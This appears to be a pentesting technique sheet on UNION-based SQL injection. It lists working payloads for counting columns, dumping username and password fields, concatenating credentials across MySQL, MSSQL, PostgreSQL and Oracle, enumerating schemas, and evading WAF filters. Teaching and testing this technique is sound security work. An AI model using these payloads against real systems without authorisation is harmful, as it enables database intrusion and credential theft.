# UNION-Based SQL Injection

## When this applies

- Application returns query results in the HTTP response (in-band).
- Injection point is in a `SELECT` query where the original column structure is reachable.
- You need to extract data from other tables (users, credentials, configuration).

## Technique

Use the `UNION` operator to append additional `SELECT` statements that pull data from arbitrary tables. The result of the injected `SELECT` appears in the response alongside (or instead of) the legitimate query output.

Two enumeration tasks must be solved before you can exfiltrate:

1. **Column count** of the original query (UNION requires matching column count).
2. **Column data type** (at least one string-compatible column to receive data).

## Steps

### 1. Determine column count

**Method 1 - NULL injection** (continue until error disappears):

```
'+UNION+SELECT+NULL--
'+UNION+SELECT+NULL,NULL--
'+UNION+SELECT+NULL,NULL,NULL--
```

**Method 2 - ORDER BY** (continue until error appears):

```
'+ORDER+BY+1--
'+ORDER+BY+2--
'+ORDER+BY+3--
```

`NULL` is preferred because it is compatible with all data types and avoids type-mismatch errors.

### 2. Find a string-compatible column

```
'+UNION+SELECT+'abcdef',NULL,NULL--
'+UNION+SELECT+NULL,'abcdef',NULL--
'+UNION+SELECT+NULL,NULL,'abcdef'--
```

The column whose position renders the string in the response accepts text data.

### 3. Extract from another table

```
'+UNION+SELECT+'abc','def'--
'+UNION+SELECT+username,password+FROM+users--
```

### 4. Concatenate when only one usable column exists

| Database | Operator | Example |
|---|---|---|
| Oracle | `\|\|` | `'+UNION+SELECT+NULL,username\|\|':'\|\|password+FROM+users--` |
| Microsoft SQL Server | `+` | `'+UNION+SELECT+NULL,username+':'+password+FROM+users--` |
| PostgreSQL | `\|\|` | `'+UNION+SELECT+NULL,username\|\|':'\|\|password+FROM+users--` |
| MySQL | `CONCAT()` | `'+UNION+SELECT+NULL,CONCAT(username,':',password)+FROM+users--` |

### 5. Pull database version

```
'+UNION+SELECT+@@version,NULL#                          (MySQL/MSSQL)
'+UNION+SELECT+version(),NULL--                         (PostgreSQL/MySQL)
'+UNION+SELECT+BANNER,NULL+FROM+v$version--             (Oracle)
```

Oracle requires a `FROM` clause for every `SELECT`; use `FROM dual` for literal selections:

```
'+UNION+SELECT+'abc','def'+FROM+dual--
```

### 6. Enumerate schema

Non-Oracle:

```
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
'+UNION+SELECT+username_abcdef,password_abcdef+FROM+users_abcdef--
```

Oracle (table/column names are UPPERCASE):

```
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
'+UNION+SELECT+USERNAME_ABCDEF,PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
```

## Verifying success

- Column count is correct when the response no longer returns a database error and at least your injected `NULL` row appears in the rendered output.
- Data type is correct when your test string (`'abcdef'`) is rendered verbatim in the response.
- Extraction works when usernames/passwords/version strings appear inside the page (often in product listings, table rows, or other rendered output).

## Common pitfalls

- Forgetting that MySQL requires a space (or newline) after `--` — use `#` instead, or `-- ` (with space).
- Oracle `SELECT` without `FROM dual` raises `ORA-00923: FROM keyword not found`.
- Returning rows that the application filters or only renders the first one — use `LIMIT 1`/`ROWNUM=1` or move data to a column the renderer displays.
- Mismatched data types between injected `NULL` and the original column may still error on strict databases — try numeric `1` if `NULL` fails.
- ORDER BY error messages can be suppressed; in that case rely on UNION SELECT NULL.

## Tools

- Burp Repeater for iterative column-count probing.
- sqlmap (`--technique=U`) for automation once the injection point is confirmed.
- Hackvertor for encoding when WAFs filter `UNION`.
